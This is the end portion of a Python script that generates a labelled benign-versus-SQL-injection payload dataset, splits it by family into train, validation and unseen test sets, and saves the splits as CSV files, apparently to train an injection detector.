        raise RuntimeError(f"FAMILY LEAKAGE DETECTED between Val and Test Unseen: {val_fam_set.intersection(test_fam_set)}")

    return df_train, df_val, df_test_unseen


def main() -> None:
    if TOTAL_SAMPLES <= 0 or not isinstance(TOTAL_SAMPLES, int):
        raise ValueError(f"TOTAL_SAMPLES must be a positive integer, got: {TOTAL_SAMPLES}")
    if not (0.999 <= (TRAIN_RATIO + VAL_RATIO + TEST_RATIO) <= 1.001):
        raise ValueError("TRAIN_RATIO, VAL_RATIO, and TEST_RATIO must sum to 1.0")

    print(f"[*] Generating {TOTAL_SAMPLES:,} samples...")

    generator = PayloadGenerator(seed=RANDOM_SEED)
    dataset, stats = generator.generate_full_dataset(target_count=TOTAL_SAMPLES)
    df_all = pd.DataFrame(dataset)

    df_train, df_val, df_test_unseen = split_dataset_by_family(
        df_all,
        train_ratio=TRAIN_RATIO,
        val_ratio=VAL_RATIO,
        test_ratio=TEST_RATIO,
        seed=RANDOM_SEED
    )

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    df_all.to_csv(PAYLOADS_ALL_CSV, index=False, encoding="utf-8")
    df_train.to_csv(PAYLOADS_TRAIN_CSV, index=False, encoding="utf-8")
    df_val.to_csv(PAYLOADS_VAL_CSV, index=False, encoding="utf-8")
    df_test_unseen.to_csv(PAYLOADS_TEST_UNSEEN_CSV, index=False, encoding="utf-8")

    n_total = len(df_all)
    n_norm = (df_all["label"] == 0).sum()
    n_sqli = (df_all["label"] == 1).sum()
    n_train = len(df_train)
    n_val = len(df_val)
    n_test = len(df_test_unseen)

    print(f"[+] Hoan thanh: {n_total:,} mau ({n_norm:,} Benign / {n_sqli:,} SQLi) | Train: {n_train:,}, Val: {n_val:,}, Test: {n_test:,}")
    print(f"    - Da luu: {PAYLOADS_ALL_CSV.name}, {PAYLOADS_TRAIN_CSV.name}, {PAYLOADS_VAL_CSV.name}, {PAYLOADS_TEST_UNSEEN_CSV.name}")


if __name__ == "__main__":
    main()
